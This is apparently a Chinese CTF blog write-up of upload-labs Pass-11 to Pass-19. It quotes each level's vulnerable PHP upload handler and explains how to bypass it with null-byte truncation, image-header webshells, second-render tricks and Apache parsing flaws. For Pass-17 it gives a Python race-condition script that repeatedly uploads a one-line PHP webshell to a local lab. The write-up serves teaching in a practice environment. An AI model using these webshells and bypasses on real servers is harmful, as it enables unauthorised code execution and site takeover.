<p>$is_upload = false;<br>$msg = null;<br>if(isset($_POST[‘submit’])){<br>    $ext_arr = array(‘jpg’,’png’,’gif’);<br>    $file_ext = substr($_FILES[‘upload_file’][‘name’],strrpos($_FILES[‘upload_file’][‘name’],”.”)+1);<br>    if(in_array($file_ext,$ext_arr)){<br>        $temp_file = $_FILES[‘upload_file’][‘tmp_name’];<br>        $img_path = $_GET[‘save_path’].”/“.rand(10, 99).date(“YmdHis”).”.”.$file_ext;</p>
<pre><code>    if(move_uploaded_file($temp_file,$img_path)){
        $is_upload = true;
    } else {
        $msg = &apos;上传出错！&apos;;
    }
} else{
    $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 拦截方式：以时间戳方式对上传文件进行命名</span><br><span class="line"></span><br><span class="line">* 绕过方式：使用上传路径名%00截断绕过，不过这需要对文件有足够的权限，比如说创建</span><br><span class="line">文件夹，上传的文件名写成1.jpg, save_path改成../upload/1.php%00，最后保存下来的文件就是1.php</span><br><span class="line">//某些情况下可以使用 %00 截断</span><br><span class="line">1、PHP 版本 &lt; 5.3.4</span><br><span class="line">2、php.ini 中 magic_quotes_gpc=off</span><br><span class="line"></span><br><span class="line">#### 0x12 Pass-12</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if(isset($_POST[‘submit’])){<br>    $ext_arr = array(‘jpg’,’png’,’gif’);<br>    $file_ext = substr($_FILES[‘upload_file’][‘name’],strrpos($_FILES[‘upload_file’][‘name’],”.”)+1);<br>    if(in_array($file_ext,$ext_arr)){<br>        $temp_file = $_FILES[‘upload_file’][‘tmp_name’];<br>        $img_path = $_POST[‘save_path’].”/“.rand(10, 99).date(“YmdHis”).”.”.$file_ext;</p>
<pre><code>    if(move_uploaded_file($temp_file,$img_path)){
        $is_upload = true;
    } else {
        $msg = &quot;上传失败&quot;;
    }
} else {
    $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* 原理与11相同，```$img_path = $_POST[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;save_path``` 从 GET 变成了 POST, 此时不能再使用 %00 截断, 原因是 %00 截断在 GET 中被 url 解码之后是空字符, 但是在 POST 中 %00 不会被 url 解码, 所以只能通过 burpsuite 修改 hex 值为 00 进行截断.</span><br><span class="line">这里把 2b(&apos;+&apos;的 hex) 修改成 00</span><br><span class="line"></span><br><span class="line">#### 0x13 Pass-13</span><br></pre></td></tr></table></figure>

<p>function getReailFileType($filename){<br>    $file = fopen($filename, “rb”);<br>    $bin = fread($file, 2); //只读2字节<br>    fclose($file);<br>    $strInfo = @unpack(“C2chars”, $bin);<br>    $typeCode = intval($strInfo[‘chars1’].$strInfo[‘chars2’]);<br>    $fileType = ‘’;<br>    switch($typeCode){<br>        case 255216:<br>            $fileType = ‘jpg’;<br>            break;<br>        case 13780:<br>            $fileType = ‘png’;<br>            break;<br>        case 7173:<br>            $fileType = ‘gif’;<br>            break;<br>        default:<br>            $fileType = ‘unknown’;<br>        }<br>        return $fileType;<br>}</p>
<p>$is_upload = false;<br>$msg = null;<br>if(isset($_POST[‘submit’])){<br>    $temp_file = $_FILES[‘upload_file’][‘tmp_name’];<br>    $file_type = getReailFileType($temp_file);</p>
<pre><code>if($file_type == &apos;unknown&apos;){
    $msg = &quot;文件未知，上传失败！&quot;;
}else{
    $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;
    if(move_uploaded_file($temp_file,$img_path)){
        $is_upload = true;
    } else {
        $msg = &quot;上传出错！&quot;;
    }
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">* 拦截方式：1、保证上传后的图片马中仍然包含完整的一句话或webshell代码。2.图片马要.jpg,.png,.gif三种后缀都上传成功才算过关！</span><br><span class="line"></span><br><span class="line">* 绕过方式：</span><br><span class="line">(1)只读文件的前两个字节，在文件的开端添加gif的标志文件头GIF89a，可进行绕过;</span><br><span class="line">(2)使用命令```copy 1.jpg /b + shell.php /a webshell.jpg```将一句话木马添加到图片中也可(但是我们没有办法拿到shell，应为我们上传的图片马无法被解析成php形式，通常图片马配合%00或者0x00截断上传，或者配合解析漏洞)</span><br><span class="line"></span><br><span class="line">#### 0x14 Pass-14</span><br></pre></td></tr></table></figure>

<p>function isImage($filename){<br>    $types = ‘.jpeg|.png|.gif’;<br>    if(file_exists($filename)){<br>        $info = getimagesize($filename);<br>        $ext = image_type_to_extension($info[2]);<br>        if(stripos($types,$ext)){<br>            return $ext;<br>        }else{<br>            return false;<br>        }<br>    }else{<br>        return false;<br>    }<br>}</p>
<p>$is_upload = false;<br>$msg = null;<br>if(isset($_POST[‘submit’])){<br>    $temp_file = $_FILES[‘upload_file’][‘tmp_name’];<br>    $res = isImage($temp_file);<br>    if(!$res){<br>        $msg = “文件未知，上传失败！”;<br>    }else{<br>        $img_path = UPLOAD_PATH.”/“.rand(10, 99).date(“YmdHis”).$res;<br>        if(move_uploaded_file($temp_file,$img_path)){<br>            $is_upload = true;<br>        } else {<br>            $msg = “上传出错！”;<br>        }<br>    }<br>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 拦截方式：</span><br><span class="line">(1)[getimagesize() 函数](https://blog.csdn.net/sanbingyutuoniao123/article/details/52166617)用于获取图像尺寸，给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</span><br><span class="line">(2)image_type_to_extension() 函数用于获取图片后缀</span><br><span class="line">* 绕过方式：同 13</span><br><span class="line"></span><br><span class="line">#### 0x15 Pass-15</span><br></pre></td></tr></table></figure>

<p>function isImage($filename){<br>    //需要开启php_exif模块<br>    $image_type = exif_imagetype($filename);<br>    switch ($image_type) {<br>        case IMAGETYPE_GIF:<br>            return “gif”;<br>            break;<br>        case IMAGETYPE_JPEG:<br>            return “jpg”;<br>            break;<br>        case IMAGETYPE_PNG:<br>            return “png”;<br>            break;<br>        default:<br>            return false;<br>            break;<br>    }<br>}</p>
<p>$is_upload = false;<br>$msg = null;<br>if(isset($_POST[‘submit’])){<br>    $temp_file = $_FILES[‘upload_file’][‘tmp_name’];<br>    $res = isImage($temp_file);<br>    if(!$res){<br>        $msg = “文件未知，上传失败！”;<br>    }else{<br>        $img_path = UPLOAD_PATH.”/“.rand(10, 99).date(“YmdHis”).”.”.$res;<br>        if(move_uploaded_file($temp_file,$img_path)){<br>            $is_upload = true;<br>        } else {<br>            $msg = “上传出错！”;<br>        }<br>    }<br>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* 拦截方式：exif_imagetype的作用也是根据文件头判断文件类型, 所以一样可以使用图片马绕过.</span><br><span class="line"></span><br><span class="line">* 绕过方式：同13</span><br><span class="line"></span><br><span class="line">#### 0x16 Pass-16</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])){<br>    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径<br>    $filename = $_FILES[‘upload_file’][‘name’];<br>    $filetype = $_FILES[‘upload_file’][‘type’];<br>    $tmpname = $_FILES[‘upload_file’][‘tmp_name’];</p>
<pre><code>$target_path=UPLOAD_PATH.basename($filename);

// 获得上传文件的扩展名
$fileext= substr(strrchr($filename,&quot;.&quot;),1);

//判断文件后缀与类型，合法才进行上传操作
if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){
    if(move_uploaded_file($tmpname,$target_path))
    {
        //使用上传的图片生成新的图片
        $im = imagecreatefromjpeg($target_path);

        if($im == false){
            $msg = &quot;该文件不是jpg格式的图片！&quot;;
            @unlink($target_path);
        }else{
            //给新图片指定文件名
            srand(time());
            $newfilename = strval(rand()).&quot;.jpg&quot;;
            $newimagepath = UPLOAD_PATH.$newfilename;
            imagejpeg($im,$newimagepath);
            //显示二次渲染后的图片（使用用户上传图片生成的新图片）
            $img_path = UPLOAD_PATH.$newfilename;
            @unlink($target_path);
            $is_upload = true;
        }
    } else {
        $msg = &quot;上传出错！&quot;;
    }

}else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){
    if(move_uploaded_file($tmpname,$target_path))
    {
        //使用上传的图片生成新的图片
        $im = imagecreatefrompng($target_path);

        if($im == false){
            $msg = &quot;该文件不是png格式的图片！&quot;;
            @unlink($target_path);
        }else{
             //给新图片指定文件名
            srand(time());
            $newfilename = strval(rand()).&quot;.png&quot;;
            $newimagepath = UPLOAD_PATH.$newfilename;
            imagepng($im,$newimagepath);
            //显示二次渲染后的图片（使用用户上传图片生成的新图片）
            $img_path = UPLOAD_PATH.$newfilename;
            @unlink($target_path);
            $is_upload = true;               
        }
    } else {
        $msg = &quot;上传出错！&quot;;
    }

}else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){
    if(move_uploaded_file($tmpname,$target_path))
    {
        //使用上传的图片生成新的图片
        $im = imagecreatefromgif($target_path);
        if($im == false){
            $msg = &quot;该文件不是gif格式的图片！&quot;;
            @unlink($target_path);
        }else{
            //给新图片指定文件名
            srand(time());
            $newfilename = strval(rand()).&quot;.gif&quot;;
            $newimagepath = UPLOAD_PATH.$newfilename;
            imagegif($im,$newimagepath);
            //显示二次渲染后的图片（使用用户上传图片生成的新图片）
            $img_path = UPLOAD_PATH.$newfilename;
            @unlink($target_path);
            $is_upload = true;
        }
    } else {
        $msg = &quot;上传出错！&quot;;
    }
}else{
    $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。</span><br><span class="line">这里提供一个包含一句话webshell代码并可以绕过PHP的imagecreatefromgif函数的GIF图片示例。</span><br><span class="line">php图像二次渲染：</span><br><span class="line">https://blog.csdn.net/hitwangpeng/article/details/48661433</span><br><span class="line">https://blog.csdn.net/hitwangpeng/article/details/46548849  </span><br><span class="line"></span><br><span class="line">#### 0x17 Pass-17</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;</p>
<p>if(isset($_POST[‘submit’])){<br>    $ext_arr = array(‘jpg’,’png’,’gif’);<br>    $file_name = $_FILES[‘upload_file’][‘name’];<br>    $temp_file = $_FILES[‘upload_file’][‘tmp_name’];<br>    $file_ext = substr($file_name,strrpos($file_name,”.”)+1);<br>    $upload_file = UPLOAD_PATH . ‘/‘ . $file_name;</p>
<pre><code>if(move_uploaded_file($temp_file, $upload_file)){
    if(in_array($file_ext,$ext_arr)){
         $img_path = UPLOAD_PATH . &apos;/&apos;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
         rename($upload_file, $img_path);
         $is_upload = true;
    }else{
        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
        unlink($upload_file);
    }
}else{
    $msg = &apos;上传出错！&apos;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 利用条件竞争删除文件时间差绕过。使用命令pip install hackhttp安装hackhttp模块，运行下面的Python代码即可。如果还是删除太快，可以适当调整线程并发数。</span><br></pre></td></tr></table></figure>

<p>#!/usr/bin/env python</p>
<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="coding:utf-8"></a>coding:utf-8</h1><p>import hackhttp<br>from multiprocessing.dummy import Pool as ThreadPool</p>
<p>def upload(lists):<br>    hh = hackhttp.hackhttp()<br>    raw = “””POST /upload-labs/Pass-17/index.php HTTP/1.1<br>Host: 127.0.0.1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://127.0.0.1/upload-labs/Pass-17/index.php" target="_blank" rel="noopener">http://127.0.0.1/upload-labs/Pass-17/index.php</a><br>Cookie: pass=17<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Type: multipart/form-data; boundary=—————————6696274297634<br>Content-Length: 341</p>
<p>—————————–6696274297634<br>Content-Disposition: form-data; name=”upload_file”; filename=”17.php”<br>Content-Type: application/octet-stream</p>
<?php assert($_POST["LandGrey"])?>
<p>—————————–6696274297634<br>Content-Disposition: form-data; name=”submit”</p>
<p>上传<br>—————————–6696274297634–<br>“””<br>    code, head, html, redirect, log = hh.http(‘<a href="http://127.0.0.1/upload-labs/Pass-17/index.php&#39;" target="_blank" rel="noopener">http://127.0.0.1/upload-labs/Pass-17/index.php&#39;</a>, raw=raw)<br>    print(str(code) + “\r”)</p>
<p>pool = ThreadPool(10)<br>pool.map(upload, range(10000))<br>pool.close()<br>pool.join()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在脚本运行的时候，访问Webshell</span><br><span class="line"></span><br><span class="line">#### 0x18 Pass-18</span><br></pre></td></tr></table></figure>

<p>//index.php<br>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’]))<br>{<br>    require_once(“./myupload.php”);<br>    $imgFileName =time();<br>    $u = new MyUpload($_FILES[‘upload_file’][‘name’], $_FILES[‘upload_file’][‘tmp_name’], $_FILES[‘upload_file’][‘size’],$imgFileName);<br>    $status_code = $u-&gt;upload(UPLOAD_PATH);<br>    switch ($status_code) {<br>        case 1:<br>            $is_upload = true;<br>            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;<br>            break;<br>        case 2:<br>            $msg = ‘文件已经被上传，但没有重命名。’;<br>            break;<br>        case -1:<br>            $msg = ‘这个文件不能上传到服务器的临时文件存储目录。’;<br>            break;<br>        case -2:<br>            $msg = ‘上传失败，上传目录不可写。’;<br>            break;<br>        case -3:<br>            $msg = ‘上传失败，无法上传该类型文件。’;<br>            break;<br>        case -4:<br>            $msg = ‘上传失败，上传的文件过大。’;<br>            break;<br>        case -5:<br>            $msg = ‘上传失败，服务器已经存在相同名称文件。’;<br>            break;<br>        case -6:<br>            $msg = ‘文件无法上传，文件不能复制到目标目录。’;<br>            break;<br>        default:<br>            $msg = ‘未知错误！’;<br>            break;<br>    }<br>}</p>
<p>//myupload.php<br>class MyUpload{<br>……<br>……<br>……<br>  var $cls_arr_ext_accepted = array(<br>      “.doc”, “.xls”, “.txt”, “.pdf”, “.gif”, “.jpg”, “.zip”, “.rar”, “.7z”,”.ppt”,<br>      “.html”, “.xml”, “.tiff”, “.jpeg”, “.png” );</p>
<p>……<br>……<br>……<br>  /** upload()<br>   **<br>   ** Method to upload the file.<br>   ** This is the only method to call outside the class.<br>   ** @para String name of directory we upload to<br>   ** @returns void<br>  **/<br>  function upload( $dir ){</p>
<pre><code>$ret = $this-&gt;isUploadedFile();

if( $ret != 1 ){
  return $this-&gt;resultUpload( $ret );
}

$ret = $this-&gt;setDir( $dir );
if( $ret != 1 ){
  return $this-&gt;resultUpload( $ret );
}

$ret = $this-&gt;checkExtension();
if( $ret != 1 ){
  return $this-&gt;resultUpload( $ret );
}

$ret = $this-&gt;checkSize();
if( $ret != 1 ){
  return $this-&gt;resultUpload( $ret );    
}

// if flag to check if the file exists is set to 1

if( $this-&gt;cls_file_exists == 1 ){

  $ret = $this-&gt;checkFileExists();
  if( $ret != 1 ){
    return $this-&gt;resultUpload( $ret );    
  }
}

// if we are here, we are ready to move the file to destination

$ret = $this-&gt;move();
if( $ret != 1 ){
  return $this-&gt;resultUpload( $ret );    
}

// check if we need to rename the file

if( $this-&gt;cls_rename_file == 1 ){
  $ret = $this-&gt;renameFile();
  if( $ret != 1 ){
    return $this-&gt;resultUpload( $ret );    
  }
}

// if we are here, everything worked as planned :)

return $this-&gt;resultUpload( &quot;SUCCESS&quot; );</code></pre><p>  }<br>……<br>……<br>……<br>};</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 刚开始没有找到绕过方法，最后下载作者Github提供的打包环境，利用上传重命名竞争+Apache解析漏洞，成功绕过。</span><br><span class="line">上传名字为18.php.7Z的文件，快速重复提交该数据包，会提示文件已经被上传，但没有被重命名。快速提交上面的数据包，可以让文件名字不被重命名上传成功，然后利用Apache的解析漏洞，即可获得shell。</span><br><span class="line"></span><br><span class="line">#### 0x19 Pass-19</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“php”,”php5”,”php4”,”php3”,”php2”,”html”,”htm”,”phtml”,”pht”,”jsp”,”jspa”,”jspx”,”jsw”,”jsv”,”jspf”,”jtml”,”asp”,”aspx”,”asa”,”asax”,”ascx”,”ashx”,”asmx”,”cer”,”swf”,”htaccess”);</p>
<pre><code>    $file_name = trim($_POST[&apos;save_name&apos;]);
    $file_name = deldot($file_name);//删除文件名末尾的点
    $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);
    $file_ext = strtolower($file_ext); //转换为小写
    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
    $file_ext = trim($file_ext); //首尾去空

    if(!in_array($file_ext,$deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH . &apos;/&apos; .$file_name;
        if (move_uploaded_file($temp_file, $img_path)) { 
            $is_upload = true;
        }else{
            $msg = &apos;上传出错！&apos;;
        }
    }else{
        $msg = &apos;禁止保存为该类型文件！&apos;;
    }

} else {
    $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;
}</code></pre><p>}</p>
<pre><code>* 原理同11，上传的文件名用0x00绕过。改成19.php【二进制00】.1.jpg

&gt;![](https://upload-images.jianshu.io/upload_images/9223646-de070594f1d760e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

####参考
[write_up1](https://www.cnblogs.com/bmjoker/p/9141322.html)
[write_up2](http://www.she1don.cn/index.php/archives/38.html)</code></pre>
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
          
            <a href="/tags/uploads/" rel="tag"><i class="fa fa-tag"></i> uploads</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/09/14/算法/3-sum-closest/" rel="next" title="3-sum-closest">
                <i class="fa fa-chevron-left"></i> 3-sum-closest
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/09/14/CTF/攻防世界--crypto--新手区/" rel="prev" title="攻防世界--crypto--新手区">
                攻防世界--crypto--新手区 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/blog-logo.jpg" alt="hf1dw">
            
              <p class="site-author-name" itemprop="name">hf1dw</p>
              <p class="site-description motion-element" itemprop="description">Good habits are more important than hard work</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">48</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">43</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">40</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/hf1dw" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i></a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://www.jianshu.com/u/41daca7ad841" target="_blank" title="简书">
                      
                        <i class="fa fa-fw fa-heartbeat"></i></a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-[object Object]"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">©2019 by hf1dw</span>

  
</div>








        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/src/love.js"></script>
